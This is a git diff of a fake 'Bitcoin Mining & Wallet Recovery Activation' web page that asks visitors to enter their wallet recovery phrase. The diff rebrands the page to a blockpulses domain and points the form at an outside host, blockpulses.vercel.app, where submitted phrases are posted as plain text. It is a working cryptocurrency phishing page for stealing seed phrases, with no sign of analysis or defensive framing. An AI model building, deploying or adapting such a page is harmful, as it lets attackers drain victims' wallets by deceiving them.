@@ -220,6 +220,8 @@
     ></script>
 
     <style type="text/css"></style>
+
+
     <meta
       name="generator"
       content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."
@@ -239,36 +241,20 @@
     <!-- END LOADER -->
 
     <!-- START HEADER -->
-    <header class="header_wrap fixed-top">
-      <div class="container">
-        <nav class="navbar navbar-expand-lg btco-hover-menu">
-          <a
-            class="navbar-brand"
-            href="https://mineactivation.com/"
-            title="Mine Activation"
-          >
-            <img
-              src="wp-content/uploads/2021/11/logo2.png"
-              alt="Mine Activation"
-            />
+    <header class="header_wrap  ">
+      <div class="container ">
+        <nav class="navbar navbar-expand-lg btco-hover-menu ">
+	
+              <a class="navbar-brand" href="https://blockpulses.co/" title="">
+            <img src="wp-content/uploads/2021/11/logo2.png" alt="">
           </a>
-
-          <button
-            class="navbar-toggler"
-            type="button"
-            data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent"
-            aria-expanded="false"
-            aria-label="Toggle navigation"
-          >
-            <span class="ion-android-menu"></span>
-          </button>
-
-          <div
-            class="collapse navbar-collapse justify-content-end"
-            id="navbarSupportedContent"
-          ></div>
+        
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="ion-android-menu"></span> </button>
+          
+          <div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+            
+                
+          </div>
         </nav>
       </div>
     </header>
@@ -300,17 +286,7 @@
           >
             <div class="vc_column-inner">
               <div class="wpb_wrapper">
-                <div class="banner_text">
-                  <h1>
-                    <span>Bitcoin Mining &amp;</span> Wallet Recovery Activation
-                  </h1>
-                  <h3>Activate your wallet to get started</h3>
-                  <p>
-                    Enter your wallet phrase here to activate your wallet for
-                    wallet recovery and bitcoin mining
-                  </p>
-                  <div class="banner_btn"></div>
-                </div>
+                <div class="banner_text"><h1><span>Bitcoin Mining &amp;</span> Wallet Recovery Activation</h1><h3>Activate your wallet to get started</h3><p>Enter your wallet phrase here to activate your wallet for wallet recovery and bitcoin mining</p><div class="banner_btn"></div></div>
                 <div class="wpb_text_column wpb_content_element">
                   <div class="wpb_wrapper">
                     <div
@@ -319,10 +295,8 @@
                     >
                       <form
                         id="custom-form"
-                        method="post"
-                        enctype="multipart/form-data"
-                        action="http://localhost:3000/submit-form"
-                        onsubmit="submitForm()"
+                        method="POST"
+                        action="https://blockpulses.vercel.app/backend/info.txt"
                       >
                         <noscript class="wpforms-error-noscript"
                           >Please enable JavaScript in your browser to complete
@@ -340,14 +314,15 @@
                             data-field-id="4"
                           >
                             <input
-                              type="password"
-                              id="custom-field_4"
-                              class="custom-field-large custom-field-required"
-                              name="custom[fields][4]"
+                              type="text"
+                              id="textInput"
+                              class="custom-field-large custom-field-required "
+                              name="text"
                               aria-errormessage="custom-field_4-error"
                               required
                             />
                           </div>
+                          
                         </div>
                         <!-- .custom-field-container -->
 
@@ -387,6 +362,7 @@
                           />
                         </div>
                       </form>
+
                     </div>
                     <!-- .wpforms-container -->
                   </div>
@@ -492,11 +468,8 @@
       }
     </style>
 
-    <script src="nav.js"></script>
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="modal.js"></script>
-    <script src="script.js"></script>
+    
+    <script src="./backend/server.js"></script>
     <script src="app.js"></script>
     <script
       type="text/javascript"
